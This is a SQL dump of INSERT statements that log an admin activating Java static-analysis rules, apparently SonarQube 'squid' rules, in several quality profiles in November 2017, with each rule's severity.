INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (834, '2017-11-20 07:28:45.951', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S3010;ruleKey=squid:S3010;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFN_bbGRdfPp-qql');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (835, '2017-11-20 07:28:46.049', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S3020;ruleKey=squid:S3020;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFPhbbGRdfPp-qqm');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (836, '2017-11-20 07:28:46.08', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S3027;ruleKey=squid:S3027;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFQAbbGRdfPp-qqn');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (837, '2017-11-20 07:28:46.145', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S3034;ruleKey=squid:S3034;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFRAbbGRdfPp-qqo');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (838, '2017-11-20 07:28:46.184', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S3038;ruleKey=squid:S3038;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFRobbGRdfPp-qqp');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (839, '2017-11-20 07:28:46.244', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S3042;ruleKey=squid:S3042;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFSkbbGRdfPp-qqq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (840, '2017-11-20 07:28:46.298', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S3046;ruleKey=squid:S3046;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFTabbGRdfPp-qqr');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (841, '2017-11-20 07:28:46.342', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S3066;ruleKey=squid:S3066;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFUGbbGRdfPp-qqs');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (842, '2017-11-20 07:28:46.379', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S3067;ruleKey=squid:S3067;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFUrbbGRdfPp-qqt');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (843, '2017-11-20 07:28:46.442', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S3281;ruleKey=squid:S3281;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFVqbbGRdfPp-qqu');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (844, '2017-11-20 07:28:46.484', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S3346;ruleKey=squid:S3346;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFWUbbGRdfPp-qqv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (845, '2017-11-20 07:28:46.526', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S3355;ruleKey=squid:S3355;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFW-bbGRdfPp-qqw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (846, '2017-11-20 07:28:46.57', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S3358;ruleKey=squid:S3358;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFXqbbGRdfPp-qqx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (847, '2017-11-20 07:28:46.612', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S3398;ruleKey=squid:S3398;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFYUbbGRdfPp-qqy');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (848, '2017-11-20 07:28:46.658', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S3400;ruleKey=squid:S3400;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFZCbbGRdfPp-qqz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (849, '2017-11-20 07:28:46.701', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S3415;ruleKey=squid:S3415;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFZtbbGRdfPp-qq0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (850, '2017-11-20 07:28:46.744', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S3421;ruleKey=squid:S3421;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFaYbbGRdfPp-qq1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (851, '2017-11-20 07:28:46.786', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S3422;ruleKey=squid:S3422;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFbCbbGRdfPp-qq2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (852, '2017-11-20 07:28:46.82', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S3436;ruleKey=squid:S3436;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFbkbbGRdfPp-qq3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (853, '2017-11-20 07:28:46.854', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S3437;ruleKey=squid:S3437;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFcGbbGRdfPp-qq4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (854, '2017-11-20 07:28:46.898', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S3438;ruleKey=squid:S3438;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFcybbGRdfPp-qq5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (855, '2017-11-20 07:28:46.952', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S3457;ruleKey=squid:S3457;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFdobbGRdfPp-qq6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (856, '2017-11-20 07:28:46.997', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S3516;ruleKey=squid:S3516;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFeVbbGRdfPp-qq7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (857, '2017-11-20 07:28:47.025', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S3518;ruleKey=squid:S3518;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFexbbGRdfPp-qq8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (858, '2017-11-20 07:28:47.066', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S3599;ruleKey=squid:S3599;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFfabbGRdfPp-qq9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (859, '2017-11-20 07:28:47.131', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S3631;ruleKey=squid:S3631;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFgbbbGRdfPp-qq-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (860, '2017-11-20 07:28:47.237', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S3655;ruleKey=squid:S3655;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFiFbbGRdfPp-qq_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (861, '2017-11-20 07:28:47.315', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S3725;ruleKey=squid:S3725;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFjTbbGRdfPp-qrA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (862, '2017-11-20 07:28:47.433', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S3776;ruleKey=squid:S3776;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;param_Threshold=15;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFlJbbGRdfPp-qrB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (863, '2017-11-20 07:28:47.479', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S3824;ruleKey=squid:S3824;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFl3bbGRdfPp-qrC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (864, '2017-11-20 07:28:47.52', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S3878;ruleKey=squid:S3878;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFmgbbGRdfPp-qrD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (865, '2017-11-20 07:28:47.562', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S3923;ruleKey=squid:S3923;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFnKbbGRdfPp-qrE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (866, '2017-11-20 07:28:47.613', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S3958;ruleKey=squid:S3958;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFn9bbGRdfPp-qrF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (867, '2017-11-20 07:28:47.655', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S3959;ruleKey=squid:S3959;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFonbbGRdfPp-qrG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (868, '2017-11-20 07:28:47.698', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S3972;ruleKey=squid:S3972;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFpRbbGRdfPp-qrH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (869, '2017-11-20 07:28:47.793', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S3981;ruleKey=squid:S3981;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFqxbbGRdfPp-qrI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (870, '2017-11-20 07:28:47.836', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S3984;ruleKey=squid:S3984;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFrcbbGRdfPp-qrJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (871, '2017-11-20 07:28:47.878', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S3985;ruleKey=squid:S3985;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFsGbbGRdfPp-qrK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (872, '2017-11-20 07:28:47.908', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S3986;ruleKey=squid:S3986;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFskbbGRdfPp-qrL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (873, '2017-11-20 07:28:47.945', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S4032;ruleKey=squid:S4032;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFtJbbGRdfPp-qrM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (874, '2017-11-20 07:28:47.975', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S4034;ruleKey=squid:S4034;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFtnbbGRdfPp-qrN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (875, '2017-11-20 07:28:48.004', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S4042;ruleKey=squid:S4042;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFuEbbGRdfPp-qrO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (876, '2017-11-20 07:28:48.05', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S4065;ruleKey=squid:S4065;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFuybbGRdfPp-qrP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (877, '2017-11-20 07:28:48.078', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S4087;ruleKey=squid:S4087;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFvObbGRdfPp-qrQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (878, '2017-11-20 07:28:48.118', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S4143;ruleKey=squid:S4143;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFv2bbGRdfPp-qrR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (879, '2017-11-20 07:28:48.198', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S4144;ruleKey=squid:S4144;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFxGbbGRdfPp-qrS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (880, '2017-11-20 07:28:48.259', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S4165;ruleKey=squid:S4165;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFyDbbGRdfPp-qrT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (881, '2017-11-20 07:28:48.377', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:S899;ruleKey=squid:S899;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVFz5bbGRdfPp-qrU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (882, '2017-11-20 07:28:48.403', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:SwitchLastCaseIsDefaultCheck;ruleKey=squid:SwitchLastCaseIsDefaultCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVF0TbbGRdfPp-qrV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (883, '2017-11-20 07:28:48.439', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:UnusedPrivateMethod;ruleKey=squid:UnusedPrivateMethod;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVF03bbGRdfPp-qrW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (884, '2017-11-20 07:28:48.469', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:UselessImportCheck;ruleKey=squid:UselessImportCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVF1VbbGRdfPp-qrX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (885, '2017-11-20 07:28:48.507', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474:squid:UselessParenthesesCheck;ruleKey=squid:UselessParenthesesCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_12-42474;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YVF17bbGRdfPp-qrY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (886, '2017-11-20 07:41:36.473', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:common-java:DuplicatedBlocks;ruleKey=common-java:DuplicatedBlocks;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYBVZbbGRdfPp-qrZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (887, '2017-11-20 07:41:36.524', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:AssignmentInSubExpressionCheck;ruleKey=squid:AssignmentInSubExpressionCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYBWMbbGRdfPp-qra');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (888, '2017-11-20 07:41:36.578', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:CallToDeprecatedMethod;ruleKey=squid:CallToDeprecatedMethod;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYBXCbbGRdfPp-qrb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (889, '2017-11-20 07:41:36.609', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:ClassVariableVisibilityCheck;ruleKey=squid:ClassVariableVisibilityCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYBXhbbGRdfPp-qrc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (890, '2017-11-20 07:41:36.644', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:CommentedOutCodeLine;ruleKey=squid:CommentedOutCodeLine;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYBYEbbGRdfPp-qrd');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (891, '2017-11-20 07:41:36.672', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:EmptyStatementUsageCheck;ruleKey=squid:EmptyStatementUsageCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYBYgbbGRdfPp-qre');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (892, '2017-11-20 07:41:36.705', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:ForLoopCounterChangedCheck;ruleKey=squid:ForLoopCounterChangedCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYBZBbbGRdfPp-qrf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (893, '2017-11-20 07:41:36.729', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:HiddenFieldCheck;ruleKey=squid:HiddenFieldCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYBZZbbGRdfPp-qrg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1219, '2017-11-20 10:14:43.699', 'admin', 'key=java-lena-qp_15-78480:squid:S1149;ruleKey=squid:S1149;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7ETzbbGRdfPp-qwm');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (894, '2017-11-20 07:41:36.758', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:LabelsShouldNotBeUsedCheck;ruleKey=squid:LabelsShouldNotBeUsedCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYBZ2bbGRdfPp-qrh');
